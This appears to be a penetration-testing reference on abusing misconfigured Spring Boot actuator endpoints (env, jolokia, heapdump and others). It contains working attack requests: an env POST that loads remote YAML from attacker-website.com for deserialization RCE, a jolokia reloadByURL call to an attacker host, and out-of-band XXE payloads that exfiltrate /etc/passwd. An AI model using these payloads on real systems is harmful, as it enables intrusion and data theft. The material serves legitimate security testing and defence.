Spring Boot includes a number of additional features called [actuators](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html) to help monitor and control your application when you push it to production. Actuators allow you to control and monitor your application using either HTTP or JMX endpoints. Auditing, health and metrics gathering can also open a hidden door to the server if the application has been misconfigured.

Spring Boot includes a number of built-in [endpoints](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html#production-ready-endpoints) ([endpoints](https://docs.spring.io/spring-boot/docs/1.5.x/reference/html/production-ready-endpoints.html) for Spring Boot 1.x) and lets you add your own. For example, the `health` endpoint provides basic application health information.

Each individual endpoint can be enabled or disabled and exposed (made remotely accessible) over HTTP or JMX. An endpoint is considered to be available when it is both enabled and exposed. The built-in endpoints will only be auto-configured when they are available. Most applications choose exposure via HTTP, where the ID of the endpoint along with a prefix of `/actuator` is mapped to a URL. For example, by default, the health endpoint is mapped to `/actuator/health`.

To learn more about the actuator's endpoints and their request and response formats, see [here](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/).

# env

Exposes properties from Spring's `ConfigurableEnvironment`.

> Spring Boot 2.x uses json instead of x-www-form-urlencoded for property change requests via the `env` endpoint.

> Information returned by the `env` and `configprops` endpoints can be somewhat sensitive so keys matching a certain pattern are [sanitized](https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/howto-actuator.html#howto-sanitize-sensible-values) by default. However, there are still ways to get the plaintext value for such keys, see [here](https://github.com/LandGrey/SpringBootVulExploit#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80).

## spring.datasource.tomcat.validationQuery

`spring.datasource.tomcat.validationQuery` allows you to specify any SQL query, and it will be automatically executed against the current database. It could be any statement, including insert, update, or delete.

![](img/validation-query.png)

## spring.datasource.tomcat.url

`spring.datasource.tomcat.url` allows you to modify the current JDBC connection string.

The problem here is that when the application establishing the connection to the database is already running, just updating the JDBC string has no effect. But you can try using `spring.datasource.tomcat.max-active` to increase the number of simultaneous database connections.

Thus, you can change the JDBC connection string, increase the number of connections, and then send many requests to the application to simulate a heavy load. Under load, the application will create a new database connection with an updated malicious JDBC string.

![](img/current-jdbc-connection.png)

## spring.cloud.bootstrap.location

`spring.cloud.bootstrap.location` allows you to load external config and parse it in YAML format.

```http
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/json
Content-Length: 76
 
{"spring.cloud.bootstrap.location":"http://attacker-website.com/yaml-payload.yml"}
```

And you also need to call the `/refresh` endpoint.

```http
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Length: 0
```

When the YAML configuration is loaded from a remote server, it is parsed by the `SnakeYAML` library, which is susceptible to deserialization attacks. The payload can be generated using [marshalsec research](https://github.com/mbechler/marshalsec).

## Properties requiring /restart call

These properties have no effect unless the `/restart` endpoint is called, which restarts the entire `ApplicationContext` and is disabled by default.

- `spring.datasource.url` - database connection string; used only for the first connection
    - [MySQL JDBC deserialization RCE](https://github.com/LandGrey/SpringBootVulExploit#0x08mysql-jdbc-deserialization-rce)
- `spring.datasource.jndiName` - databases JNDI string; used only for the first connection
- `spring.datasource.tomcat.dataSourceJNDI` - databases JNDI string; not used at all
- `spring.cloud.config.uri` - spring cloud config url; have no effect after app start, only the initial values are used
- `spring.datasource.hikari.connection-test-query` - the query to be executed before granting the connection from the pool; see [Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)
- `spring.h2.console.enabled` - bool value which enables/disables the embedded GUI console of the H2 database; see [H2 database console JNDI injection](https://github.com/LandGrey/SpringBootVulExploit#0x07h2-database-console-jndi-rce)

> There are many other interesting properties, but most of them do not take effect immediately after being changed

# trace/httptrace

Displays HTTP trace information (by default, the last 100 HTTP request-response exchanges). Requires an `HttpTraceRepository` bean.

# mappings

Displays a collated list of all `@RequestMapping` paths.

# sessions

Allows retrieval and deletion of user sessions from a Spring Session-backed session store. Requires a Servlet-based web application using Spring Session.

# shutdown

Lets the application be gracefully shutdown. Disabled by default.

# heapdump

Returns an hprof heap dump file.

# jolokia

Exposes JMX beans over HTTP (when Jolokia is on the classpath, not available for WebFlux). Requires a dependency on `jolokia-core`.

## Logback::reloadByURL

You can list all available MBeans actions using the URL:

```http
http://127.0.0.1:8090/jolokia/list
```

Most MBeans actions just expose some system data, but if the `reloadByURL` action provided by the `Logback` library exists:

![](img/jolokia-list.png)

the logging configuration can be reload from an external URL:

```http
http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml
```

### Out-Of-Band XXE

`Logback` uses XML configuration parsed by the `SAXParser` XML parser with external entities enabled. You can exploit this feature to trigger an Out-Of-Band XXE:

```xml
<!-- logback.xml -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://attacker-website.com/file.dtd">%remote;%int;]>
<a>&trick;</a>
```

```xml
<!-- file.dtd -->
<!ENTITY % d SYSTEM "file:///etc/passwd"> 
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

![Server response with error and contents of `/etc/passwd` file](img/oob-xxe.png)

### RCE via JNDI

The `Logback` configuration has the feature [Obtaining variables from JNDI](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). In the XML configuration file you can include a tag like:

```xml
<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName"/>
```

In this case, the `env-entry-name` attribute will be passed to the `DirContext.lookup()` method. Providing an arbitrary name to the `lookup` method can lead to remote code execution via remote class loading.

See here:
- [A Journey From JNDI/LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

## Tomcat::createJNDIRealm

One of the MBeans of Tomcat (embedded into Spring Boot) is `createJNDIRealm`, which allows you to create JNDIRealm vulnerable to JNDI injection. Details of exploitation see [here](https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html) and [here](https://github.com/LandGrey/SpringBootVulExploit#0x05jolokia-realm-jndi-rce).

## Jookia CVEs

- [How I made more than $30K with Jolokia CVEs](https://blog.it-securityguard.com/how-i-made-more-than-30k-with-jolokia-cves/)
- [Jolokia Vulnerabilities - RCE & XSS](https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html)

# logfile

Returns the contents of the logfile (if `logging.file.name` or `logging.file.path` properties have been set). Supports the use of the HTTP Range header to retrieve part of the log file's content.

# dump/threaddump

Performs a thread dump.

# References

- [Spring Boot Actuator: Production-ready Features](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html)
- [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [Spring Boot Actuator (jolokia) XXE/RCE](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)
- [Spring Boot Vulnerability (to be continued....)](https://github.com/pyn3rd/Spring-Boot-Vulnerability)